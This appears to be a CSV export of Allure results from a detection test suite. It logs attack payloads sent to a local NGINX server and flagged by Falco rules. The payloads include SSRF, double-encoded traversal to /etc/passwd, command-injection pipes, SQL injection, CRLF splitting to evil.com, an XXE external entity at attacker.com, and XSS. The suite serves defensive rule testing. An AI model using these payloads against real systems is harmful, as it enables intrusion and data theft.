"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_002` |
| **Name** | Internal Elasticsearch Access |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://127.0.0.1:9200/_cat/indices`
- **Encoded**: `http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~9000ms
- **Timestamp**: 15:07:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_002-1770995243346-jo5xbq pattern_id=SSRF_INT_002 uri=/?q=http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_002-1770995243346-jo5xbq pattern_id=SSRF_INT_002 uri=/?q=http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices client=127.0.0.1

**Falco Log Entry**:
```
15:07:23.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_002-1770995243346-jo5xbq pattern_id=SSRF_INT_002 uri=/?q=http%3A%2F%2F127.0.0.1%3A9200%2F_cat%2Findices client=127.0.0.1
```","2","test_e2e_with_logs[491_SSRF_INT_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_002` |
| **Name** | Double encoded forward slash |
| **Category** | PATH |
| **Subcategory** | double_encoding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%252f..%252f..%252fetc%252fpasswd`
- **Encoded**: `..%25252f..%25252f..%25252fetc%25252fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 15:06:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DBL_002-1770995197891-mne91s pattern_id=PATH_DBL_002 uri=/?q=..%25252f..%25252f..%25252fetc%25252fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DBL_002-1770995197891-mne91s pattern_id=PATH_DBL_002 uri=/?q=..%25252f..%25252f..%25252fetc%25252fpasswd client=127.0.0.1

**Falco Log Entry**:
```
15:06:37.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DBL_002-1770995197891-mne91s pattern_id=PATH_DBL_002 uri=/?q=..%25252f..%25252f..%25252fetc%25252fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[240_PATH_DBL_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_004` |
| **Name** | Directory listing piped to head |
| **Category** | CMDI |
| **Subcategory** | pipe |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `ls -la | head -10`
- **Encoded**: `ls%20-la%20%7C%20head%20-10`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 15:06:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1770995218937-dbxl4m pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1770995218937-dbxl4m pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1

**Falco Log Entry**:
```
15:06:58.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1770995218937-dbxl4m pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1
```","2","test_e2e_with_logs[359_CMD_PIPE_004]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_082` |
| **Name** | MySQL Comment Bypass with SELECT |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/*!SELECT*/user,password`
- **Encoded**: `%2F%2A%21SELECT%2A%2Fuser%2Cpassword`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 15:06:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_082-1770995205943-3sz0z pattern_id=SQLI_ADV_082 uri=/?q=%2F%2A%21SELECT%2A%2Fuser%2Cpassword client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_082-1770995205943-3sz0z pattern_id=SQLI_ADV_082 uri=/?q=%2F%2A%21SELECT%2A%2Fuser%2Cpassword client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:45.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_082-1770995205943-3sz0z pattern_id=SQLI_ADV_082 uri=/?q=%2F%2A%21SELECT%2A%2Fuser%2Cpassword client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[008_SQLI_ADV_082]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_RESP_003` |
| **Name** | HTTP 302 Response Splitting |
| **Category** | CRLF |
| **Subcategory** | response_splitting |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\r\nHTTP/1.1 302 Found\r\nLocation:http://evil.com`
- **Encoded**: `%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~2000ms
- **Timestamp**: 15:07:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_RESP_003-1770995250351-gvuv6n pattern_id=CRLF_RESP_003 uri=/?q=%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_RESP_003-1770995250351-gvuv6n pattern_id=CRLF_RESP_003 uri=/?q=%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1

**Falco Log Entry**:
```
15:07:30.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_RESP_003-1770995250351-gvuv6n pattern_id=CRLF_RESP_003 uri=/?q=%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1
```","2","test_e2e_with_logs[561_CRLF_RESP_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_002` |
| **Name** | Process list piped to grep |
| **Category** | CMDI |
| **Subcategory** | pipe |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `ps aux | grep apache`
- **Encoded**: `ps%20aux%20%7C%20grep%20apache`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 15:06:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_002-1770995217934-wov3lx pattern_id=CMD_PIPE_002 uri=/?q=ps%20aux%20%7C%20grep%20apache client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_002-1770995217934-wov3lx pattern_id=CMD_PIPE_002 uri=/?q=ps%20aux%20%7C%20grep%20apache client=127.0.0.1

**Falco Log Entry**:
```
15:06:57.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_002-1770995217934-wov3lx pattern_id=CMD_PIPE_002 uri=/?q=ps%20aux%20%7C%20grep%20apache client=127.0.0.1
```","2","test_e2e_with_logs[357_CMD_PIPE_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_011` |
| **Name** | Lowercase sleep function |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `sleep(5)`
- **Encoded**: `sleep%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~82000ms
- **Timestamp**: 15:06:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1770995170353-5533tm pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1770995170353-5533tm pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:10.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1770995170353-5533tm pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[106_SQLI_TIME_011]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_002` |
| **Name** | XXE external DTD parameter entity |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd"">`
- **Encoded**: `%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 15:06:35.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1770995195840-4he8iq pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1770995195840-4he8iq pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
15:06:35.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1770995195840-4he8iq pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[470_XXE_ENTITY_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_006` |
| **Name** | Input onfocus XSS with autofocus |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<input onfocus=alert('XSS') autofocus>`
- **Encoded**: `%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~80000ms
- **Timestamp**: 15:06:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_006-1770995172845-l0gby3 pattern_id=XSS_REFL_006 uri=/?q=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_006-1770995172845-l0gby3 pattern_id=XSS_REFL_006 uri=/?q=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:12.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_006-1770995172845-l0gby3 pattern_id=XSS_REFL_006 uri=/?q=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[196_XSS_REFL_006]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_061` |
| **Name** | DOM outerHTML Mutation |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `element.outerHTML=payload`
- **Encoded**: `element.outerHTML%3Dpayload`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 15:06:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_061-1770995200404-6nexaf pattern_id=XSS_ADV_061 uri=/?q=element.outerHTML%3Dpayload client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_061-1770995200404-6nexaf pattern_id=XSS_ADV_061 uri=/?q=element.outerHTML%3Dpayload client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:40.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_061-1770995200404-6nexaf pattern_id=XSS_ADV_061 uri=/?q=element.outerHTML%3Dpayload client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[129_XSS_ADV_061]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
